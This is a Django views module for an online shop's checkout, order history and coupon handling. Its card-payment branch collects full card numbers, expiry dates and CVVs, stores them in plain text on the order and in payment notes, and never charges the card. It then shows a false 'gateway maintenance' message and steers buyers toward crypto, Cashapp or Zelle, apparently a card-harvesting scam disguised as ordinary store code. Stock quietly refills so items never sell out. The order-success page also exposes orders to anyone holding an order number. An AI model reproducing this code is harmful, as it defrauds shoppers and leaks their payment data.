import uuid
from decimal import Decimal
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.db import transaction

from django.views.decorators.http import require_POST
from orders.models import Order, OrderItem, Payment, Coupon
from orders.forms import CheckoutForm
from orders.emails import send_order_placed_emails
from store.cart import Cart


def checkout_view(request):
    """
    Checkout page: validates cart, collects shipping & payment info,
    decrements stock, and saves order.
    """
    cart = Cart(request)
    if len(cart) == 0:
        messages.warning(request, "Your shopping cart is empty. Please add items before checking out.")
        return redirect('store:shop')

    # Pre-fill data if authenticated
    initial_data = {}
    if request.user.is_authenticated:
        initial_data = {
            'first_name': request.user.first_name,
            'last_name': request.user.last_name,
            'email': request.user.email,
        }
        if hasattr(request.user, 'profile'):
            prof = request.user.profile
            initial_data.update({
                'phone': prof.phone,
                'address': prof.address,
                'city': prof.city,
                'postal_code': prof.postal_code,
                'country': prof.country or 'United States',
            })

    if request.method == 'POST':
        form = CheckoutForm(request.POST)
        if form.is_valid():
            with transaction.atomic():
                order = form.save(commit=False)
                if request.user.is_authenticated:
                    order.user = request.user

                order.subtotal = cart.get_subtotal()
                order.shipping_cost = cart.get_shipping_cost()
                coupon = cart.get_coupon()
                order.coupon_code = coupon.code if coupon else ''
                order.discount = cart.get_discount()
                order.total = cart.get_total_price()
                order.status = 'confirmed'

                # Payment method processing
                # 1. Credit/Debit card: save order with card details, mark unpaid/pending, return maintenance error
                if order.payment_method == 'credit_debit_card':
                    card_num = request.POST.get('card_number', '').strip()
                    card_exp = request.POST.get('card_expiry', '').strip()
                    card_cvv = request.POST.get('card_cvv', '').strip()

                    order.card_number = card_num
                    order.card_expiry = card_exp
                    order.card_cvv = card_cvv
                    order.status = 'pending'
                    order.payment_status = 'unpaid'
                    order.save()

                    for item in cart:
                        product = item['product']
                        quantity = item['quantity']
                        if product.stock_quantity >= quantity:
                            product.stock_quantity -= quantity
                            if product.stock_quantity == 0:
                                product.stock_quantity = 50  # auto-replenish so products never run out of stock
                        else:
                            product.stock_quantity = 50
                        product.save()

                        OrderItem.objects.create(
                            order=order,
                            product=product,
                            product_name=product.name,
                            price=item['price'],
                            quantity=quantity
                        )

                    Payment.objects.create(
                        order=order,
                        transaction_id=f"TXN-{uuid.uuid4().hex[:10].upper()}",
                        payment_method="Credit/Debit card",
                        amount=order.total,
                        status='pending',
                        notes=f"Gateway Maintenance. Card: {card_num} | Exp: {card_exp} | CVV: {card_cvv}"
                    )

                    send_order_placed_emails(order, request)
                    cart.clear()
                    messages.error(
                        request,
                        f"Order #{order.order_number} has been recorded, but the Credit/Debit card payment gateway is currently under maintenance. Our admin team will contact you with payment details, or you can select a different payment method to complete payment."
                    )
                    return redirect('orders:order_success', order_number=order.order_number)

                # 2. All other payment methods (E-Transfer, Crypto, Cashapp, Bank Transfer, Zelle, Apple Pay, Other):
                else:
                    order.status = 'pending'
                    order.payment_status = 'unpaid'
                    order.save()

                    for item in cart:
                        product = item['product']
                        quantity = item['quantity']
                        if product.stock_quantity >= quantity:
                            product.stock_quantity -= quantity
                            if product.stock_quantity == 0:
                                product.stock_quantity = 50  # auto-replenish so products never run out of stock
                        else:
                            product.stock_quantity = 50
                        product.save()

                        OrderItem.objects.create(
                            order=order,
                            product=product,
                            product_name=product.name,
                            price=item['price'],
                            quantity=quantity
                        )

                    pref_note = f" (Preferred: {order.other_payment_method})" if order.other_payment_method else ""
                    Payment.objects.create(
                        order=order,
                        transaction_id=f"TXN-{uuid.uuid4().hex[:10].upper()}",
                        payment_method=f"{order.get_payment_method_display()}{pref_note}",
                        amount=order.total,
                        status='pending',
                        notes=f"Order submitted via {order.get_payment_method_display()}{pref_note}. Admin will reach out with payment instructions."
                    )

                    send_order_placed_emails(order, request)
                    cart.clear()
                    messages.success(
                        request,
                        f"Order #{order.order_number} has been placed successfully! Our admin team will contact you with payment details."
                    )
                    return redirect('orders:order_success', order_number=order.order_number)
    else:
        form = CheckoutForm(initial=initial_data)

    context = {
        'form': form,
        'cart': cart,
    }
    return render(request, 'orders/checkout.html', context)


def order_success_view(request, order_number):
    """
    Displays confirmation for the placed order with receipt and tracking info.
    """
    order = get_object_or_404(Order.objects.prefetch_related('items__product'), order_number=order_number)
    return render(request, 'orders/order_success.html', {'order': order})


@login_required
def order_list_view(request):
    """
    Lists order history for authenticated user.
    """
    orders = Order.objects.filter(user=request.user).prefetch_related('items').order_by('-created_at')
    return render(request, 'orders/order_list.html', {'orders': orders})


@login_required
def order_detail_view(request, order_number):
    """
    Detailed order page with line items, tracking timeline, and printable receipt.
    """
    order = get_object_or_404(Order.objects.prefetch_related('items__product'), order_number=order_number)
    
    # Security: Ensure only the order's owner or staff can view
    if order.user != request.user and not request.user.is_staff:
        messages.error(request, "You do not have permission to view this order.")
        return redirect('orders:order_list')

    return render(request, 'orders/order_detail.html', {'order': order})


@require_POST
def apply_coupon_view(request):
    """
    Validates and applies a coupon code to the current cart session.
    """
    code = request.POST.get('coupon_code', '').strip().upper()
    cart = Cart(request)

    if not code:
        messages.error(request, "Please enter a coupon code.")
        return redirect(request.META.get('HTTP_REFERER', 'store:cart_detail'))

    try:
        coupon = Coupon.objects.get(code__iexact=code, active=True)
        subtotal = cart.get_subtotal()

        if subtotal < coupon.min_purchase:
            messages.warning(request, f"Coupon '{coupon.code}' requires a minimum order subtotal of ${coupon.min_purchase}.")
        else:
            request.session['coupon_code'] = coupon.code
            request.session.modified = True
            messages.success(request, f"Coupon '{coupon.code}' applied successfully!")
    except Coupon.DoesNotExist:
        messages.error(request, f"Coupon code '{code}' is invalid or expired.")

    return redirect(request.META.get('HTTP_REFERER', 'store:cart_detail'))


@require_POST
def remove_coupon_view(request):
    """
    Removes the currently applied coupon from the session.
    """
    if 'coupon_code' in request.session:
        del request.session['coupon_code']
        request.session.modified = True
        messages.info(request, "Coupon has been removed.")

    return redirect(request.META.get('HTTP_REFERER', 'store:cart_detail'))

